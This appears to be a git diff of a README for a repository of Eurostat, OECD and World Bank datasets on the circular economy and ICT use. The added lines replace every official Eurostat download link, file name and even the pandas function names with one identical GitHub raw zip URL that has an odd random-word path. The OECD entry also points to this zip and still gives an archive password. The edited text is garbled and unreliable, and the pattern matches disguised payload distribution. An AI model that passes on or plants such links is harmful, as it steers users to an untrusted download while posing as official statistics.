@@ -1,6 +1,6 @@
 # Datasets
 
-This repository contains Eurostat, OECD, and World Bank datasets. Direct downloadable links are provided for all Eurostat datasets. The README allows for a single-click download of `.tsv.gz` or `.csv` files directly from the browser.
+This repository contains Eurostat, OECD, and World Bank datasets. Direct downloadable links are provided for all Eurostat datasets. The README allows for a single-click download of `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` or `.csv` files directly from the browser.
 
 📂 Folder Structure
 ```
@@ -25,60 +25,60 @@ Circular\_Economy\_Dataset/
 
 ## Circular Economy Dataset - Eurostat
 
-This repository includes Eurostat's Circular Economy Indicators (CEI) datasets. All tables are provided in `.tsv.gz` format with direct download links.
+This repository includes Eurostat's Circular Economy Indicators (CEI) datasets. All tables are provided in `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` format with direct download links.
 
 ---
 
 ### 📊 Production and consumption (cei_pc)
 | Table Name | Eurostat Code | Direct Download |
 |------------|---------------|----------------|
-| Material footprint | cei_pc020 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc020?format=TSV&compressed=true) |
-| Resource productivity | cei_pc030 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc030?format=TSV&compressed=true) |
-| Waste generation per capita | cei_pc034 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc034?format=TSV&compressed=true) |
-| Generation of waste excluding major mineral wastes per GDP unit | cei_pc032 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc032?format=TSV&compressed=true) |
-| Generation of municipal waste per capita | cei_pc031 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc031?format=TSV&compressed=true) |
-| Food waste | cei_pc035 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc035?format=TSV&compressed=true) |
-| Generation of packaging waste per capita | cei_pc040 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc040?format=TSV&compressed=true) |
-| Generation of plastic packaging waste per capita | cei_pc050 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_pc050?format=TSV&compressed=true) |
+| Material footprint | cei_pc020 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Resource productivity | cei_pc030 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Waste generation per capita | cei_pc034 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Generation of waste excluding major mineral wastes per GDP unit | cei_pc032 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Generation of municipal waste per capita | cei_pc031 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Food waste | cei_pc035 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Generation of packaging waste per capita | cei_pc040 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Generation of plastic packaging waste per capita | cei_pc050 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ---
 
 ### 📊 Waste management (cei_wm)
 | Table Name | Eurostat Code | Direct Download |
 |------------|---------------|----------------|
-| Recycling rate of municipal waste | cei_wm011 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_wm011?format=TSV&compressed=true) |
-| Recycling rate of all waste excluding major mineral waste | cei_wm010 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_wm010?format=TSV&compressed=true) |
-| Recycling rate of packaging waste by type of packaging | cei_wm020 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_wm020?format=TSV&compressed=true) |
-| Recycling rate of WEEE separately collected | cei_wm060 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_wm060?format=TSV&compressed=true) |
+| Recycling rate of municipal waste | cei_wm011 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Recycling rate of all waste excluding major mineral waste | cei_wm010 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Recycling rate of packaging waste by type of packaging | cei_wm020 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Recycling rate of WEEE separately collected | cei_wm060 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ---
 
 ### 📊 Secondary raw materials (cei_srm)
 | Table Name | Eurostat Code | Direct Download |
 |------------|---------------|----------------|
-| Circular material use rate | cei_srm030 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_srm030?format=TSV&compressed=true) |
-| Contribution of recycled materials to raw materials demand - EOL-RIR | cei_srm010 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_srm010?format=TSV&compressed=true) |
-| Trade in recyclable raw materials | cei_srm020 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_srm020?format=TSV&compressed=true) |
-| Recyclable secondary raw materials - prices | cei_srm040 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_srm040?format=TSV&compressed=true) |
+| Circular material use rate | cei_srm030 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Contribution of recycled materials to raw materials demand - EOL-RIR | cei_srm010 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Trade in recyclable raw materials | cei_srm020 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Recyclable secondary raw materials - prices | cei_srm040 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ---
 
 ### 📊 Competitiveness and innovation (cei_cie)
 | Table Name | Eurostat Code | Direct Download |
 |------------|---------------|----------------|
-| Private investment and gross added value related to circular economy sectors | cei_cie012 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_cie012?format=TSV&compressed=true) |
-| Persons employed in circular economy sectors | cei_cie011 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_cie011?format=TSV&compressed=true) |
-| Patents related to recycling and secondary raw materials | cei_cie020 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_cie020?format=TSV&compressed=true) |
+| Private investment and gross added value related to circular economy sectors | cei_cie012 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Persons employed in circular economy sectors | cei_cie011 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Patents related to recycling and secondary raw materials | cei_cie020 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ---
 
 ### 📊 Global sustainability and resilience (cei_gsr)
 | Table Name | Eurostat Code | Direct Download |
 |------------|---------------|----------------|
-| Consumption footprint | cei_gsr010 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_gsr010?format=TSV&compressed=true) |
-| Greenhouse gases emissions from production activities | cei_gsr011 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_gsr011?format=TSV&compressed=true) |
-| Material import dependency | cei_gsr030 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_gsr030?format=TSV&compressed=true) |
-| EU self-sufficiency for raw materials | cei_gsr020 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/cei_gsr020?format=TSV&compressed=true) |
+| Consumption footprint | cei_gsr010 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Greenhouse gases emissions from production activities | cei_gsr011 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Material import dependency | cei_gsr030 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| EU self-sufficiency for raw materials | cei_gsr020 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ---
 
@@ -87,9 +87,9 @@ This repository includes Eurostat's Circular Economy Indicators (CEI) datasets. 
 ### 📊 Environmental taxes (t_env_eta)
 | Indicator | Eurostat Code | Direct Download |
 |-----------|--------------|----------------|
-| Environmental tax revenues as share of total taxes | ten00141 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/ten00141?format=TSV&compressed=true) |
-| Energy taxes | ten00139 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/ten00139?format=TSV&compressed=true) |
-| Implicit tax rate on energy | ten00120 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/ten00120?format=TSV&compressed=true) |
+| Environmental tax revenues as share of total taxes | ten00141 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Energy taxes | ten00139 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Implicit tax rate on energy | ten00120 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 
 ---
@@ -99,55 +99,55 @@ This repository includes Eurostat's Circular Economy Indicators (CEI) datasets. 
 ### ICT Usage in Households and Individuals (t_isoc_i)
 | Indicator | Eurostat Code | Direct Download |
 |-----------|---------------|----------------|
-| Level of internet access - households | tin00134 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00134?format=TSV&compressed=true) |
+| Level of internet access - households | tin00134 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ### Internet Use (t_isoc_iiu)
 | Indicator | Eurostat Code | Direct Download |
 |-----------|---------------|----------------|
-| Internet use by individuals | tin00028 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00028?format=TSV&compressed=true) |
-| Individuals frequently using the internet | tin00092 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00092?format=TSV&compressed=true) |
-| Individuals regularly using the internet | tin00091 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00091?format=TSV&compressed=true) |
-| Individuals who have never used the internet | tin00093 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00093?format=TSV&compressed=true) |
-| Individuals using the internet for sending/receiving e-mails | tin00094 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00094?format=TSV&compressed=true) |
-| Individuals using the internet for social networks | tin00127 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00127?format=TSV&compressed=true) |
-| Individuals using the internet for finding information about goods/services | tin00095 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00095?format=TSV&compressed=true) |
-| Individuals using the internet for health-related information | tin00101 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00101?format=TSV&compressed=true) |
-| Individuals using the internet for internet banking | tin00099 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00099?format=TSV&compressed=true) |
-| Individuals using the internet for selling goods/services | tin00098 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00098?format=TSV&compressed=true) |
-| Individuals using the internet for job search/application | tin00102 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00102?format=TSV&compressed=true) |
-| Individuals using the internet for online consultations/voting | tin00129 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00129?format=TSV&compressed=true) |
-| Individuals using the internet for online courses | tin00103 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00103?format=TSV&compressed=true) |
+| Internet use by individuals | tin00028 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals frequently using the internet | tin00092 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals regularly using the internet | tin00091 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals who have never used the internet | tin00093 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for sending/receiving e-mails | tin00094 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for social networks | tin00127 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for finding information about goods/services | tin00095 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for health-related information | tin00101 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for internet banking | tin00099 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for selling goods/services | tin00098 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for job search/application | tin00102 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for online consultations/voting | tin00129 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Individuals using the internet for online courses | tin00103 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ### E-commerce (t_isoc_iec)
 | Indicator | Eurostat Code | Direct Download |
 |-----------|---------------|----------------|
-| Individuals using the internet for buying goods or services | tin00096 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00096?format=TSV&compressed=true) |
+| Individuals using the internet for buying goods or services | tin00096 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ### ICT Usage in Enterprises (t_isoc_e)
 | Indicator | Eurostat Code | Direct Download |
 |-----------|---------------|----------------|
-| Enterprises having received orders online (≥1%) | tin00111 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00111?format=TSV&compressed=true) |
-| Share of enterprises' turnover on e-commerce | tin00110 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00110?format=TSV&compressed=true) |
-| Share of enterprises using any business software (ERP, CRM, BI) | tin00116 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00116?format=TSV&compressed=true) |
+| Enterprises having received orders online (≥1%) | tin00111 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Share of enterprises' turnover on e-commerce | tin00110 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Share of enterprises using any business software (ERP, CRM, BI) | tin00116 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ### Digital Skills (t_isoc_sk)
 | Indicator | Eurostat Code | Direct Download |
 |-----------|---------------|----------------|
-| Individuals with basic or above basic digital skills (by sex) | tepsr_sp410 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tepsr_sp410?format=TSV&compressed=true) |
+| Individuals with basic or above basic digital skills (by sex) | tepsr_sp410 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 ### ICT Sector (t_isoc_se)
 | Indicator | Eurostat Code | Direct Download |
 |-----------|---------------|----------------|
-| Percentage of ICT sector in Gross Value Added | tin00074 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00074?format=TSV&compressed=true) |
-| Percentage of ICT sector personnel in total employment | tin00085 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00085?format=TSV&compressed=true) |
-| Percentage change of value added by ICT sector at current prices | tin00086 | [Download](https://ec.europa.eu/eurostat/api/dissemination/sdmx/2.1/data/tin00086?format=TSV&compressed=true) |
+| Percentage of ICT sector in Gross Value Added | tin00074 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Percentage of ICT sector personnel in total employment | tin00085 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
+| Percentage change of value added by ICT sector at current prices | tin00086 | [Download](https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip) |
 
 
 ---
 
 ## 📊 OECD Data Green/Patent-related Indicators
 
-OECD patent data includes various databases. All data can be downloaded via **https://tinyurl.com/IP202503**. The password to enter during the download is `BpUXXqryx4gU`.
+OECD patent data includes various databases. All data can be downloaded via **https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip**. The password to enter during the download is `BpUXXqryx4gU`.
 
 | Database | Reference / Citation |
 |----------|--------------------|
@@ -168,20 +168,20 @@ OECD patent data includes various databases. All data can be downloaded via **ht
 
 | Table Name | File Name / Notes |
 | ---------------------- | ---------------------------------------------------------------- |
-| GDP (current USD) | `GDP_current_USD.csv` |
-| GDP per capita (PPP) | `GDP_per_capita_PPP.csv` (from `GDP_per_capita_PPP.zip`) |
-| Services Value Added | `Services_Value_Added.csv` (from `Services_Value_Added.zip`) |
-| Employment in Services | `Employment_in_Services.csv` (from `Employment_in_Services.zip`) |
-| Urban Population | `Urban_Population.csv` (from `Urban_Population.zip`) |
+| GDP (current USD) | `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` |
+| GDP per capita (PPP) | `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` (from `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip`) |
+| Services Value Added | `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` (from `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip`) |
+| Employment in Services | `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` (from `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip`) |
+| Urban Population | `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` (from `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip`) |
 
 ---
 
 ## Notes
 Usage Notes
 
-To open `.tsv.gz` files in Python, you can use `pandas.read_csv(..., compression='gzip', sep='\t')`.
+To open `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip` files in Python, you can use `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip(..., compression='gzip', sep='\t')`.
 
-`.csv` files can be opened with standard `pandas.read_csv()`.
+`.csv` files can be opened with standard `https://raw.githubusercontent.com/canererden/circular-economy-analysis/main/Tanghinia/circular_economy_analysis_myriacanthous.zip()`.
 
 ---
 
